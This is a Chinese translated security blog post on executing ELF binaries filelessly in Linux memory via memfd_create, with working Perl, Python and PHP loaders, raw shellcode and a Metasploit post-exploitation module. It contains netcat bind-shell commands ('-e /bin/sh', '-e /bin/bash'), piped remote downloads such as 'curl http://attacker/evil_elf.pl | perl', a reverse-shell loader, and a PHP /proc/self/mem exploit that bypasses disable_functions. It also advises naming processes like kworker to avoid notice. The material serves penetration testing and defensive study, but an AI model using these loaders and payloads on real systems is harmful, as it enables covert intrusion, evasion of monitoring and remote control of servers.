> 原文链接: https://www.anquanke.com//post/id/168791 


# Linux系统内存执行ELF的多种方式


                                阅读量   
                                **311756**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者fbkcs，文章来源：blog.fbkcs.ru
                                <br>原文地址：[https://blog.fbkcs.ru/en/elf-in-memory-execution/](https://blog.fbkcs.ru/en/elf-in-memory-execution/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t012ec084ce41ed5522.gif)](https://p2.ssl.qhimg.com/t012ec084ce41ed5522.gif)



## 一、前言

无文件（fileless）恶意软件攻击现在已经越来越流行，这一点并不奇怪，因为这种技术通常不会留下蛛丝马迹。本文的重点不是介绍如何在Windows RAM中执行程序，我们的目标是GNU/Linux。Linux是服务器行业的领头羊，在上百万嵌入式设备和大多数web服务上都能看到Linux的身影。在本文中，我们将简单探讨如何在Linux系统内存中执行程序，也讨论了如何应付具有挑战性的环境。

无文件执行比较隐蔽，比较难检测及跟踪。由于该过程中不涉及新文件写入磁盘，也没有修改已有文件，因此基于文件系统一致性的检测工具通常不会警告管理员。反病毒软件（*nix用户通常会忽略这种产品）在程序启动后通常不会监控程序内存。其外，当系统安装完毕后，许多GNU/Linux发行版会提供各种调试工具、解释程序、编译器和程序库，这些都可以帮助我们实现无文件技术隐蔽执行。然而，无文件执行也有一些缺点，比如无法在系统意外断电或者重启时正常驻留，但程序正常情况下可以保持运行，直到目标设备断电下线。

无文件技术可以用来传播恶意软件，但功能并不局限于此。如果我们对运行速度要求较高，可以将程序拷贝到内存中运行。许多Linux发行版可以完全在内存中运行，因此在搭载硬盘驱动器的情况下，我们还是有可能实现不落盘运行。对于信息安全而言，无文件技术在后渗透（post-exploitation）阶段和情报收集阶段非常有用，可以尽可能规避安全审计。

根据[barkly.com](https://www.barkly.com/)的介绍，在2018年35%的病毒攻击中涉及到无文件攻击技术。在Windows系统上，黑客们通常使用内置的PowerShell来加载和运行代码。这些技术之所以非常流行，原因之一是这些技术可以在Powershell Empire、Powersploit以及Metasploit中使用，非常方便。



## 二、C语言

在大多数情况下，安装在主机设备上的Linux发行版通常会安装一些内置软件，如Python、Perl解释器以及C编译器，这些都是“开箱即用”的工具。此外，web托管平台上通常也可以使用PHP。因此我们可以使用这些语言来执行代码。在Linux系统上，我们可以使用一些非常知名方法在内存中执行代码。

最简单的一种方法就是利用挂载到文件系统中的共享内存分区。

如果我们将可执行文件挂载到`/dev/shm`或者`/run/shm`中，有可能实现内存执行，因为这些目录实际上是挂载到文件系统上已分配的内存空间。但如果我们使用`ls`命令，就可以像查看其他目录一样查看这些目录。此外，已挂载的这些目录设置了`noexec`标志，因此只有超级用户才能执行这些目录中的程序。这意味着我们需要找到更为隐蔽的其他方法。

我们可以考虑使用[memfd_create(2)](http://man7.org/linux/man-pages/man2/memfd_create.2.html)这个系统调用。该系统调用与[malloc(3)](https://linux.die.net/man/3/malloc)比较类似，但并不会返回指向已分配内存的一个指针，而是返回指向某个匿名文件的文件描述符，该匿名文件以链接（link）形式存放在`/proc/PID/fd/`文件系统中，可以使用[execve(2)](http://man7.org/linux/man-pages/man2/execve.2.html)来运行。[memfd_create](http://man7.org/linux/man-pages/man2/memfd_create.2.html)帮助文档的解释如下：

> `name`参数代表文件名，在`/proc/self/fd/`目录中我们可以看到该文件名为符号链接的目的文件。显示在`/proc/self/fd/`目录中的文件名始终带有`memfd:`前缀，并且只用于调试目的。名称并不会影响文件描述符的行为，因此多个文件可以拥有相同的名称，不会有任何影响。

在C语言中使用`memfd_create()`的示例代码如下：

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;unistd.h&gt;

int
main()
`{`
    int fd;
    pid_t child;
    char buf[BUFSIZ] = "";
    ssize_t br;

    fd = syscall(SYS_memfd_create, "foofile", 0);
    if (fd == -1)
    `{`
        perror("memfd_create");
        exit(EXIT_FAILURE);
    `}`

    child = fork();
    if (child == 0)
    `{`
        dup2(fd, 1);
        close(fd);
        execlp("/bin/date", "/bin/date", NULL);
        perror("execlp date");
        exit(EXIT_FAILURE);
    `}`
    else if (child == -1)
    `{`
        perror("fork");
        exit(EXIT_FAILURE);
    `}`

    waitpid(child, NULL, 0);

    lseek(fd, 0, SEEK_SET);
    br = read(fd, buf, BUFSIZ);
    if (br == -1)
    `{`
        perror("read");
        exit(EXIT_FAILURE);
    `}`
    buf[br] = 0;

    printf("child said: '%s'n", buf);

    exit(EXIT_SUCCESS);
`}`
```

如上代码使用`memfd`创建一个子进程，将其输出重定向至一个临时文件，等待子进程结束，从临时文件中读取子进程输出数据。通常情况下，*nix环境会使用`|`管道将一个程序的输出重定向至另一个程序的输入。

在解释型语言（如perl、python等）中我们也可以使用`syscall()`。接下来我们看一下可能碰到的一种场景，演示如何使用`memfd_create()`将可执行文件载入内存中。



## 三、Perl

假设现在我们已经找到了命令注入点，我们需要找到在目标上执行系统命令的方法。在perl中我们可以使用[syscall()](https://perldoc.perl.org/functions/syscall.html)函数，此外我们还需要将ELF文件以匿名文件内容的形式直接写入内存。为了完成这个任务，我们可以将其写在脚本源码中，使用命令注入来注入脚本，当然我们也可以选择网络下载方式。然而，这里我们要清楚目标Linux内核版本，因为只有在**3.17**或更高版本内核中才能使用`memfd_create()`。

接下来进一步分析`memfd_create()`以及`execve()`。

对于匿名文件我们准备使用`MFD_CLOEXEC`常量，利用该常量可以在新打开的文件描述符上设置`close-on-exec`（`FD_CLOEXEC`）标志。这意味着当我们`execve()` ELF文件时，我们的文件描述符就会被自动关闭。

由于我们使用的是Perl的`syscall()`，因此需要调用号（call number）以及数字常量（numeric constant）。我们可以在`/usr/include`或者网上找到这些信息。系统调用号位于`#define`中，前缀为`__NR_`。在这个场景中，64位Linux系统上`memfd_create()`的系统调用号为`319`，数字常量为`FD_CLOSEXEC 0x0001U`（即`linux/memfd.h`中的`1`）。

找到所需的编号后，我们可以在Perl中实现与C语言等效的`memfd_create(name, MFD_CLOEXEC)`语句。我们还需要为文件选择一个名称，前面提到过，我们会在`/proc/self/fd/`目录中看到带有`/memfd:`前缀的文件名。因此我们最好的方法就是选择接近`[:kworker]`或者看上去不大可疑的另一个名称。

比如我们可以传入空的字符串：

```
my $name = "";
my $fd = syscall(319, $name, 1);
if (-1 == $fd) `{`
        die "memfd_create: $!";
`}`
```

现在`$fd`为匿名文件的文件描述符，我们需要将ELF写入该文件。Perl中有个[open()](http://perldoc.perl.org/functions/open.html)函数，通常用来打开文件，我们也可以使用该函数，在参数中指定`&gt;&amp;=FD`（而非文件名），将已打开的文件描述符转化为文件句柄。此外这里还需要设置`autoflush[]`。

```
open(my $FH, '&gt;&amp;='.$fd) or die "open: $!";
select((select($FH), $|=1)[0]);
```

现在我们已经搞定指向匿名文件的一个文件描述符。接下来我们需要将可执行文件提供给Perl，可以通过如下方式：

```
$ perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(&lt;&gt;)' ./elfbinary
```

以上命令会输出许多行，如下所示：

```
print $FH pack q/H*/, q/7f454c4602010100000000000000000002003e0001000000304f450000000000/ or die qq/write: $!/;
print $FH pack q/H*/, q/4000000000000000c80100000000000000000000400038000700400017000300/ or die qq/write: $!/;
print $FH pack q/H*/, q/0600000004000000400000000000000040004000000000004000400000000000/ or die qq/write: $!/;
```

执行这些语句就可以将我们的可执行文件载入内存中，等待执行。

### <a class="reference-link" name="fork()"></a>fork()

我们还可以使用[fork()](https://linux.die.net/man/2/fork)，虽然这不是必选项，但如果我们不想在运行ELF文件后退出，`fork()`就可以派上用场。通常情况下，在perl中生成子进程的方式如下所示：

```
while ($keep_going) `{`
        my $pid = fork();
        if (-1 == $pid) `{` # Error
                die "fork: $!";
        `}`
        if (0 == $pid) `{`
                exit 0;
        `}`
`}`
```

我们还可以调用`fork()`两次，再配合上[setsid(2)](http://man7.org/linux/man-pages/man2/setsid.2.html)，这样就能生成独立的子进程，结束父进程运行：

```
# Start a child process
my $pid = fork();
if (-1 == $pid) `{` # Error
        die "fork1: $!";
`}`
if (0 != $pid) `{` # the parent process terminates
        exit 0;
`}`
# the child process becomes the parent process
if (-1 == syscall(112)) `{`
        die "setsid: $!";
`}`
# a child process (grandchild) starts
$pid = fork();
if (-1 == $pid) `{` # Error
        die "fork2: $!";
`}`
if (0 != $pid) `{` # the child process terminates
        exit 0;
`}`
# “grandchild” code
```

现在我们就可以多次运行ELF进程。

### <a class="reference-link" name="Execve()"></a>Execve()

[Execve()](http://man7.org/linux/man-pages/man2/execve.2.html)这个系统调用可以用来执行程序。在perl中我们可以使用[Exec()](http://perldoc.perl.org/functions/exec.html)，这个函数效果类似，语法也更加简单。我们需要传递给`exec()`两个参数：待执行的文件（内存中的ELF文件）以及进程名。通常情况下，文件名和进程名相同，但由于我们可以在进程列表中看到`/proc/PID/fd/3`信息，因此我们需要重命名进程。调用`exec()`的语法如下：

```
exec `{`"/proc/$$/fd/$fd"`}` "nc", "-kvl", "4444", "-e", "/bin/sh" or die "exec: $!";
```

如上命令可以运行Netcat，但这个东西太像后门了，我们想要运行更为隐蔽的目标。

新创建的进程不会以`/proc/PID/fd`符号链接形式打开匿名文件，但我们还是能通过`/proc/PID/exe`符号链接看到我们的ELF文件，该符号链接指向的是进程正在执行的文件。

现在我们已经实现在Linux内存中执行ELF文件，不会在磁盘或者文件系统中留下任何痕迹。为了尽快且方便地加载可执行文件，我们可以将带有ELF文件的脚本通过管道交给Perl解释器执行：

```
$ curl http://attacker/evil_elf.pl | perl
```



## 四、Python

与Perl类似，在Python中我们也可以执行如下操作：
- 使用`memfd_create()`系统调用来创建匿名文件
- 使用可执行ELF文件填充该文件
- 执行该文件，也可以使用`fork()`多次执行该文件
```
import ctypes
import os
# read the executable file. It is a reverse shell in our case
binary = open('/tmp/rev-shell','rb').read()

fd = ctypes.CDLL(None).syscall(319,"",1) # call memfd_create and create an anonymous file
final_fd = open('/proc/self/fd/'+str(fd),'wb') # write our executable file.
final_fd.write(binary)
final_fd.close()

fork1 = os.fork() #create a child
if 0 != fork1: os._exit(0)

ctypes.CDLL(None).syscall(112) # call setsid() to create a parent.

fork2 = os.fork() #create a child from the parent. 
if 0 != fork2: os._exit(0)

os.execl('/proc/self/fd/'+str(fd),'argv0','argv1') # run our payload.
```

为了在python中调用`syscall`，我们需要标准的[ctypes](https://docs.python.org/2/library/ctypes.html)以及[os](https://docs.python.org/2/library/os.html)库，以便写入并执行文件、管理进程。所有操作步骤都与perl类似。

在如上代码中，我们读取的是位于`/tmp/`目录中的一个文件，我们也可以选择从web服务器远程加载该文件。



## 五、PHP

前面我们已经分析过perl以及python的实现代码。许多操作系统默认情况下会安装这些语言的解释器，下面让我们讨论最为有趣的一种场景。如果由于各种因素影响，我们无法使用perl以及python解释器，那么可以考虑使用PHP。这种语言在web开发者中非常流行，如果我们可以在web应用执行代码，那么很有可能就会碰到PHP解释器。

遗憾的是，php并没有处理`syscall`的内置机制。

Beched之前在rdot论坛上发表过一篇[文章](https://rdot.org/forum/showthread.php?t=3309)，文中使用[procfs](http://man7.org/linux/man-pages/man5/proc.5.html)（`/proc/self/mem`）在当前进程内存空间中将`open`重写为`system`，从而绕过`disable_functions`的限制。

我们使用了这种技巧来重写代码中涉及到系统调用的一些函数。

我们以shellcode的形式将`syscall`传递给php解释器，使用一系列命令来传递系统调用。

接下来我们一步一步实现PHP代码，这个过程中涉及到一些小技巧。

首先，我们设定所需的一些参数：

```
$elf = file_get_contents("/bin/nc.traditional"); // elf_payload
    $args = "test -lvvp 31338 -e /bin/bash";  // argv0 argv1 argv2 ...
```

然后指定偏移地址：内存中的高位（higher）及低位（lower）值，以便后面注入shellcode：

```
function packlli($value) `{`
            $higher = ($value &amp; 0xffffffff00000000) &gt;&gt; 32;
            $lower = $value &amp; 0x00000000ffffffff;
            return pack('V2', $lower, $higher);
    `}`
```

然后构造用来“unpack”二进制文件的一个函数，先执行[反转](http://www.php.su/strrev)操作，然后依次执行[bin2hex()](http://php.net/manual/ru/function.bin2hex.php)、[hexdex()](http://php.net/manual/ru/function.hexdec.php)，将二进制数值转化为十进制数值，为后面注入内存做准备：

```
function unp($value) `{`
        return hexdec(bin2hex(strrev($value)));
    `}`
```

然后解析ELF文件，获取偏移值：

```
function parseelf($bin_ver, $rela = false) `{`
    $bin = file_get_contents($bin_ver);

    $e_shoff = unp(substr($bin, 0x28, 8));
    $e_shentsize = unp(substr($bin, 0x3a, 2));
    $e_shnum = unp(substr($bin, 0x3c, 2));
    $e_shstrndx = unp(substr($bin, 0x3e, 2));

    for($i = 0; $i &lt; $e_shnum; $i += 1) `{`
        $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + 4, 4));
        if($sh_type == 11) `{` // SHT_DYNSYM
            $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
            $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
            $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
        `}`
        elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) `{` // SHT_STRTAB
            $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
            $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
        `}`
        elseif($rela &amp;&amp; $sh_type == 4) `{` // SHT_RELA
            $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_ + 24, 8));
            $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
            $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
        `}`
    `}`

    if($rela) `{`
        for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) `{`
            $r_offset = unp(substr($bin, $i, 8));
            $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32;
            $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4));
            $name = '';
            $j = $strtab_off + $name_off - 1;
            while($bin[++$j] != "") `{`
                $name .= $bin[$j];
            `}`
            if($name == 'open') `{`
                return $r_offset;
            `}`
        `}`
    `}`
    else `{`
        for($i = $dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) `{`
            $name_off = unp(substr($bin, $i, 4));
            $name = '';
            $j = $strtab_off + $name_off - 1;
            while($bin[++$j] != "") `{`
                $name .= $bin[$j];
            `}`
            if($name == '__libc_system') `{`
                $system_offset = unp(substr($bin, $i + 8, 8));
            `}`
            if($name == '__open') `{`
                $open_offset = unp(substr($bin, $i + 8, 8));
            `}`
        `}`
        return array($system_offset, $open_offset);
    `}`
```

此外我们还需要定义已安装的PHP版本信息：

```
if (!defined('PHP_VERSION_ID')) `{`
    $version = explode('.', PHP_VERSION);
    define('PHP_VERSION_ID', ($version[0] * 10000 + $version[1] * 100 + $version[2]));
`}`
if (PHP_VERSION_ID &lt; 50207) `{`
    define('PHP_MAJOR_VERSION',   $version[0]);
    define('PHP_MINOR_VERSION',   $version[1]);
    define('PHP_RELEASE_VERSION', $version[2]);
`}`
echo "[INFO] PHP major version " . PHP_MAJOR_VERSION . "n";
```

检查操作系统类型及Linux内核版本：

```
if(strpos(php_uname('a'), 'x86_64') === false) `{`
    echo "[-] This exploit is for x64 Linux. Exitingn";
    exit;
`}`

if(substr(php_uname('r'), 0, 4) &lt; 2.98) `{`
    echo "[-] Too old kernel (&lt; 2.98). Might not workn";
`}`
```

我们重写了`open[@plt](https://github.com/plt)`的地址，以便绕过`disable_functions`限制。我们适当修改了beched的代码，现在可以将shellcode注入内存中。

首先我们需要在二进制文件中找到PHP解释器的地址，为了完成这个任务，我们可以运行`/proc/self/exe`，然后使用`parseelf()`解析可执行文件：

```
echo "[INFO] Trying to get open@plt offset in PHP binaryn";
$open_php = parseelf('/proc/self/exe', true);
if($open_php == 0) `{`
    echo "[-] Failed. Exitingn";
    exit;
`}`

echo '[+] Offset is 0x' . dechex($open_php) . "n";
$maps = file_get_contents('/proc/self/maps');

preg_match('#s+(/.+libc-.+)#', $maps, $r);
echo "[INFO] Libc location: $r[1]n";

preg_match('#s+(.+[stack].*)#', $maps, $m);
$stack = hexdec(explode('-', $m[1])[0]);
echo "[INFO] Stack location: ".dechex($stack)."n";


$pie_base = hexdec(explode('-', $maps)[0]);
echo "[INFO] PIE base: ".dechex($pie_base)."n";

echo "[INFO] Trying to get open and system symbols from Libcn";
list($system_offset, $open_offset) = parseelf($r[1]);
if($system_offset == 0 or $open_offset == 0) `{`
    echo "[-] Failed. Exitingn";
    exit;
`}`
```

找到`open()`函数的地址：

```
echo "[+] Got them. Seeking for address in memoryn";
$mem = fopen('/proc/self/mem', 'rb');
fseek($mem, ((PHP_MAJOR_VERSION == 7) * $pie_base) + $open_php);

$open_addr = unp(fread($mem, 8));
echo '[INFO] open@plt addr: 0x' . dechex($open_addr) . "n";

echo "[INFO] Rewriting open@plt addressn";
$mem = fopen('/proc/self/mem', 'wb');
```

现在我们可以开始加载可执行文件。首先我们创建一个匿名文件：

```
$shellcode_loc = $pie_base + 0x100;
$shellcode="x48x31xD2x52x54x5Fx6Ax01x5Ex68x3Fx01x00x00x58x0Fx05x5AxC3";
fseek($mem, $shellcode_loc);
fwrite($mem, $shellcode);

fseek($mem, (PHP_MAJOR_VERSION == 7) * $pie_base + $open_php);
fwrite($mem, packlli($shellcode_loc));
echo "[+] Address written. Executing cmdn";
$fp = fopen('fd', 'w');
```

将payload写入匿名文件：

```
fwrite($fp, $elf);
```

查找文件描述符编号：

```
$found = false;
$fds = scandir("/proc/self/fd");
foreach($fds as $fd) `{`
    $path = "/proc/self/fd/$fd";
    if(!is_link($path)) continue;
    if(strstr(readlink($path), "memfd")) `{`
        $found = true;
        break;
    `}`
`}`
if(!$found) `{`
    echo '[-] memfd not found';
    exit;
`}`
```

将可执行文件路径写入栈：

```
fseek($mem, $stack);
fwrite($mem, "`{`$path`}`x00");
$filename_ptr = $stack;
$stack += strlen($path) + 1;
fseek($mem, $stack);
```

处理待传给可执行程序的参数：

```
fwrite($mem, str_replace(" ", "x00", $args) . "x00");
$str_ptr = $stack;
$argv_ptr = $arg_ptr = $stack + strlen($args) + 1;
foreach(explode(' ', $args) as $arg) `{`
    fseek($mem, $arg_ptr);
    fwrite($mem, packlli($str_ptr));

    $arg_ptr += 8;
    $str_ptr += strlen($arg) + 1;
`}`
fseek($mem, $arg_ptr);
fwrite($mem, packlli(0x0));

echo "[INFO] Argv: " . $args . "n";
```

然后调用`fork()`执行payload：

```
echo "[+] Starting ELFn";
$shellcode = "x6ax39x58x0fx05x85xc0x75x28x6ax70x58x0fx05x6ax39x58x0fx05x85xc0x75x1ax48xbf" 
            . packlli($filename_ptr) 
            . "x48xbe" 
            . packlli($argv_ptr) 
            . "x48x31xd2x6ax3bx58x0fx05xc3x6ax00x5fx6ax3cx58x0fx05";


fseek($mem, $shellcode_loc);
fwrite($mem, $shellcode);
fopen('done', 'r');
exit();
```



## 六、Shellcode

Shellcode实际上是可以注入内存运行的一组字节，缓冲区溢出攻击和其他攻击场景中通常会涉及这方面内容。在我们的应用场景中，shellcode并不会返回远程服务器的命令提示符（shell），但可以帮助我们执行所需的命令。

为了获取所需的字节，我们可以开发C代码然后将其转成汇编代码，或者直接使用汇编语言来开发。

我们先来试着理解隐藏在字节数组背后的内容。

```
push 57
pop rax
syscall
test eax, eax
jnz quit
```

首先我们需要运行`fork`，64位系统上对应的调用号为`57`，具体调用表可参考[此处链接](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)。

然后我们需要调用`setsid`（调用号为`112`）将子进程转换成父进程。

```
push 112
pop rax
syscall
```

然后再次调用`fork`：

```
push 57
pop rax
syscall
test eax, eax
jnz quit
```

然后再轻车熟路调用`execve()`：

```
; execve
mov rdi, 0xcafebabecafebabe ; filename
mov rsi, 0xdeadbeefdeadbeef ; argv
xor rdx, rdx ; envp
push 0x3b
pop rax
syscall
push -1
pop rax
ret
```

最后调用`exit()`（调用号为`60`）结束进程。

```
; exit
quit:
push 0
pop rdi
push 60
pop rax
syscall
```

通过这种方式我们替换了`open()`函数代码。我们的可执行文件会被注入到内存中，使用PHP解释器运行。我们可以使用shellcode来表示系统调用。



## 七、Metasploit

我们开发了一个MSF[模块](https://github.com/fbkcs/msf-elf-in-memory-execution)，方便大家使用这些技术。

我们可以将该模块文件拷贝至`$HOME/.msf4/module/post/linux/manage/download_exec_elf_in_memory.rb`，然后在Metasploit控制台执行`reload_all`命令，再输入`use post/linux/manage/download_exec_elf_in_memory`命令来使用该模块（如果拷贝至其他目录，需要使用相应的路径）。在使用该模块之前，我们需要指定一些选项。输入`show options`显示可设置的选项清单：
<li>
`ARGS`：传递给可执行文件的参数</li>
<li>
`FILE`：可执行文件路径，这里我们使用的是Netcat</li>
<li>
`NAME`：进程名。可以使用任意名称。比如，如果想隐蔽一点，可以使用`kworker:1`，如果想有趣一点，便于演示，可以使用`KittyCat`
</li>
<li>
`SESSION`：meterpreter会话。这个模块主要服务于后渗透（post-exploitation）场景</li>
- 然后我们需要设定托管payload的http服务器地址及端口，通过`SRVHOST`及`SRVPORT`来设定。
<li>
`VECTOR`：使用该方法在内存中执行程序，这不是必选参数，如果未设定，则脚本自己会寻找所需的解释器。目前我们支持PHP、Python以及Perl。</li>
接下来运行`exlpoit`或者`run`命令，大家可以参考[演示视频](https://www.youtube.com/watch?v=y9vRUItW_5c)。

整个工作原理如下：我们指定所需的会话（可以是meterpreter或者普通的反弹shell），然后设定ELF文件的本地路径、参数以及显示在进程列表中名称。启动本地web服务器来托管payload，开始搜索用于下载的实用工具（目前支持curl和wget），找到可使用的工具后，如果我们没有在`VECTOR`中指定所需的解释器，则会开始搜索所有可用的解释器。如果找到可用的解释器后，就从我们的web服务器上下载payload，通过管道传输至对应的解释器，效果类似于`$ curl http://hacker/payload.pl | perl`命令。



## 八、总结

在Linux系统中实现无文件执行ELF是渗透测试中一种非常有用的技术。这种方法较为隐蔽，可以绕过各种类型的反病毒保护机制、系统完整性保护机制以及基于硬盘监控的防护系统。通过这种方法，我们能够以最小的动静访问目标。

在本文中我们用到了Linux发行版、内置设备固件、路由器以及移动设备中常见的解释型语言，有些小伙伴们已经[研究过](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html)这方面内容，在此特别感谢他们对我们的帮助。
